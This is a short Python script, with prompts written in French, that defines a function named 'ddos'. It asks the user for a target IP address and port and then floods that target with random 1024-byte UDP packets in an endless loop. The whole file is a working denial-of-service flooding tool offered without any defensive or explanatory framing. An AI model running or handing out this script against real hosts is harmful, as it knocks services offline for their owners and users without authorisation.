import socket
import random


def ddos():
    ip = input("Entrez l adresse Ip de la cible : ")
    port = input("Entrez le port : ")

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = random._urandom(1024)
    while True:
        sock.sendto(packet, (ip, int(port)))
        print(packet)


